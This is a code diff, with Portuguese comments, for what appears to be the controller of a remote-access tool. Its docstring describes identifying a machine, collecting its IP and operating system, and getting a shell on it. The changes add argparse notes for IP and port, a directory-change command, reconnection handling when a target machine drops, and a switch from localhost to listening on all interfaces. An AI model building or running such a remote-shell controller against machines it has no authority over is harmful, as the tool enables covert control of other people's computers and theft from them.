@@ -26,6 +26,14 @@ ID: # gerada pelo hash do mac adress
 ip externo ou interno do computador
 sistema operacional
 entrar com shell nele
+
+
+argpasse
+para configurar o IP e porta, se não definir, o padrão fica 127.0.0.1
+
+
+
+cd == os.chdir(caminho) s.send(os.getcwd())
 '''
 
 import os
@@ -84,7 +92,13 @@ def shell(s):
             if(executar == 'exit'):
                 break
             retorno = s.recv(1024)
-            print(retorno)
+            if(not retorno):
+                print('maquina desconectada, tentando reconexão ...')
+                break
+            elif(retorno == ''):
+                print('2')
+            else:
+                print(retorno)
         except KeyboardInterrupt:
             break
 
@@ -132,4 +146,4 @@ def conecta(meuIP):
                 break
 
 if __name__ == '__main__':
-    conecta('127.0.0.1')
+    conecta('')
